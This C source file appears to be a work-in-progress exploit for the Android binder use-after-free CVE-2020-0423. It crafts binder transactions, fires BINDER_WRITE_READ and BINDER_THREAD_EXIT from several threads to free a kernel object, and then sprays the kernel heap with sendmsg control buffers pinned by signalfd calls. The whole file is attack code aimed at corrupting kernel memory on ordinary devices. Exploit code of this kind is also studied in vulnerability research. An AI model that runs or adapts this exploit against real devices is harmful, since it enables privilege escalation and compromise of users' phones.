#include "2020-0423.h" 
#include "binder.h"
#include <pthread.h>
#include <string.h>
#include <sys/types.h>

#define _POSIX_C_SOURCE 200112L
#define PTHREAD_BARRIER_H_

// heap spray struct def
struct spray_thread_data{
     unsigned long trigger_id;
     unsigned long spray_id;
     int sock_fds[2];
     pthread_barrier_t barrier;
};

int signalfd_fds[20][20][20];

/*
 * Generates a binder transaction able to trigger the bug
 */
static inline void init_binder_transaction(int nb) {
    /*
     * Writes `nb` times a BINDER_TYPE_BINDER object in the object buffer
     * and updates the offsets in the offset buffer accordingly
     */

    printf("[+] in generate bug binder func \n");
    
    for (int i = 0; i < nb; i++) {
        struct flat_binder_object *fbo =
            (struct flat_binder_object *)((void*)(MEM_ADDR + 0x400LL + i*sizeof(*fbo)));
        fbo->hdr.type = BINDER_TYPE_BINDER;
        fbo->binder = i;
        fbo->cookie = i;
        uint64_t *offset = (uint64_t *)((void *)(MEM_ADDR + OFFSETS_START + 8LL*i));
        *offset = i * sizeof(*fbo);
    }

    /*
     * Binder transaction data referencing the offset and object buffers
     */
    struct binder_transaction_data btd2 = {
        .flags = TF_ONE_WAY, /* we don't need a reply */
        .data_size = 0x28 * nb,
        .offsets_size = 8 * nb,
        .data.ptr.buffer = MEM_ADDR  + 0x400,
        .data.ptr.offsets = MEM_ADDR + OFFSETS_START,
    };

    uint64_t txn_size = sizeof(uint32_t) + sizeof(btd2);

    /* Transaction command */
    *(uint32_t*)(MEM_ADDR + 0x200) = BC_TRANSACTION;
    memcpy((void*)(MEM_ADDR + 0x204), &btd2, sizeof(btd2));

    /* Binder write/read structure sent to binder */
    struct binder_write_read bwr = {
        .write_size = txn_size * (1), // 1 txno
        .write_buffer = MEM_ADDR + 0x200
    };
    memcpy((void*)(MEM_ADDR + 0x100), &bwr, sizeof(bwr));
    printf("[+] made binder transaction\n");
}

/*
* setup send_msg structs for spray
*/
void *spray_thread_func(void *argp) {
    struct spray_thread_data *data = (struct spray_thread_data*)argp;
    int delay;
    int msg_buf[SENDMSG_SIZE / sizeof(int)];
    int ctl_buf[SENDMSG_CONTROL_SIZE / sizeof(int)];
    struct msghdr spray_msg;
    struct iovec siov;
    uint64_t sigset_value;

    // Sendmsg control buffer initialization
    memset(&spray_msg, 0, sizeof(spray_msg));
    ctl_buf[0] = SENDMSG_CONTROL_SIZE - WORK_STRUCT_OFFSET;
    ctl_buf[6] = 0xdeadbeef; /* w->type value */
    siov.iov_base = msg_buf;
    siov.iov_len = SENDMSG_SIZE;
    spray_msg.msg_iov = &siov;
    spray_msg.msg_iovlen = 1;
    spray_msg.msg_control = ctl_buf;
    spray_msg.msg_controllen = SENDMSG_CONTROL_SIZE - WORK_STRUCT_OFFSET;
    printf("[+] made sendmsg control buf\n");

for (;;) {
        // Barrier - Before spray
        pthread_barrier_wait(&data->barrier);

        // Waiting some time
        delay = rand() % SPRAY_DELAY;
        for (int i = 0; i < delay; i++) {}
        
        printf("[+] start signalfd spray\n");
        for (uint64_t i = 0; i < NB_SIGNALFDS; i++) {
            // Arbitrary signalfd value (will become relevant later)
            sigset_value = ~0;
            // Non-blocking sendmsg
            sendmsg(data->sock_fds[0], &spray_msg, MSG_OOB);
            // Signalfd call to pin sendmsg's control buffer in kernel memory
            signalfd_fds[data->trigger_id][data->spray_id][i] = signalfd(-1, (sigset_t*)&sigset_value, 0);

            printf("[+] try to pin sendmsg buf with signalfd\n");
            if (signalfd_fds[data->trigger_id][data->spray_id][i] <= 0)
                printf("Could not open signalfd - %d (%s)\n", signalfd_fds[data->trigger_id][data->spray_id][i], strerror(errno));
    }
        // Barrier - After spray
        pthread_barrier_wait(&data->barrier);
    }

    return NULL;
}

void *trigger_thread_func(void *argp) {
    unsigned long id = (unsigned long)argp;
    pthread_t spray_threads[NB_TRIGGER_SPRAY];
    int ret = 0;
    int binder_fd = -1;
    int binder_fd_copy = -1;

     struct spray_thread_data data;
     data.trigger_id = id;
     if(socketpair(AF_UNIX,SOCK_STREAM,0,data.sock_fds) == -1) {
         printf("[-]can not create socketpair\n");
         exit(EXIT_FAILURE);
    } else {
        printf("[+] created socketpair successfully\n");
    }

    // Opening binder device
    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0)
        printf("An error occured while opening binder");
     pthread_barrier_init(&data.barrier,NULL, NB_TRIGGER_SPRAY);

    for (;;) {

        // pid_t child = fork();
        // if( child == 0 ) {
        // for(unsigned long i = 0 ; i < NB_TRIGGER_SPRAY ; i++) {
        //     data.spray_id = i;
 
        //  printf("[+] start spray threads\n");
        //  pthread_create(&spray_threads[i], NULL, spray_thread_func, (void *)&data);
        //  }
        // }

        // Refill the memory region with the transaction
        init_binder_transaction(2);
        printf("[+] in trigger bug func \n");
        // Copying the binder fd
        binder_fd_copy = dup(binder_fd);
        
        // Sending the transaction
        ret = ioctl(binder_fd_copy, BINDER_WRITE_READ, MEM_ADDR + 0x100);
        if (ret != 0)
            printf("BINDER_WRITE_READ did not work: %d", ret);
         printf("[+] sent binder transaction \n");
        
        // Binder thread exit
        ret = ioctl(binder_fd_copy, BINDER_THREAD_EXIT, 0);
        if (ret != 0)
            printf("BINDER_WRITE_EXIT did not work: %d", ret);
        printf("[+] exit binder thread\n");

        // pid_t child = fork();
            // if( child == 0 ) {
        for(unsigned long i = 0 ; i < NB_TRIGGER_SPRAY ; i++) {
            data.spray_id = i;
    
            printf("[+] start spray threads\n");
            pthread_create(&spray_threads[i], NULL, spray_thread_func, (void *)&data);
            }
        //     }

        ret = ioctl(binder_fd, BINDER_WRITE_READ, MEM_ADDR + 0x100);
        if (ret != 0)
            printf("BINDER_WRITE_READ did not work: %d", ret);
        printf("[+] sent binder transaction2 \n");

        // Closing binder device
        close(binder_fd_copy);
        printf("[+] close binder copy \n");

    }

    return NULL;
}

int main() {
    pthread_t trigger_threads[NB_TRIGGER_THREADS];

    // Memory region for binder transactions
    mmap((void*)MEM_ADDR, MEM_SIZE, PROT_READ | PROT_WRITE,
         MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);

    // Init random
    srand(time(0));

    // Get rid of stdout/stderr buffering
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    // Starting trigger threads
    printf("Starting trigger threads");
    for (unsigned long i = 0; i < NB_TRIGGER_THREADS; i++) {
        pthread_create(&trigger_threads[i], NULL, trigger_thread_func, (void*)i);
    }
    // Waiting for trigger threads
    for (int i = 0; i < NB_TRIGGER_THREADS; i++)
        pthread_join(trigger_threads[i], NULL);

    return 0;
}
